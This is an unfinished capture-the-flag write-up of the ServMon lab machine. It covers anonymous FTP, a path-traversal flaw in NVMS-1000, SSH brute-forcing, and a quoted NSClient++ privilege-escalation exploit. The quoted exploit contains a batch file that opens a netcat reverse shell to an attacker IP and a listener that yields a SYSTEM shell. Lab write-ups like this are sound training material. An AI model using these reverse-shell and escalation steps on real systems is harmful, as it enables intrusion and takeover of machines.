# 📦 ServMon

First i start with nmap:





<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

then i try ftp anonymous and find a folder for 2 users with some txt files in it:

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

Looking at the webserver we can see it's NVMS-1000 and looking for vulnerabilities we see a LFI:

{% embed url="https://www.exploit-db.com/exploits/48311" %}

I did not manage to run the exploit so i did it manually:

<figure><img src="../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

and since i know there are passwords in nathan's Desktop i can go and request those:

<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

I can then look how to bruteforce SSH with the 2 users we're aware about:

and i find nadine's password:&#x20;

<figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>



After looking in Program FIles we find NSclient++ is installed and while looking on internet we find this that suits our situation:

{% embed url="https://www.exploit-db.com/exploits/46802" %}

```
Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
	C:\Program Files\NSClient++>nscp web -- password --display
	Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
	@echo off
	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
	nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
	- foobar
		command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
	- foobar
		interval = 1m
		command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
	nc -nlvvp 443
	listening on [any] 443 ...
	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
	Microsoft Windows [Version 10.0.17134.753]
	(c) 2018 Microsoft Corporation. All rights reserved.

	C:\Program Files\NSClient++>whoami
	whoami
	nt authority\system
```

So i start off by catching the admin password:

<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption><p>ew2x6SsGTxjRwXOT</p></figcaption></figure>

Will come back later
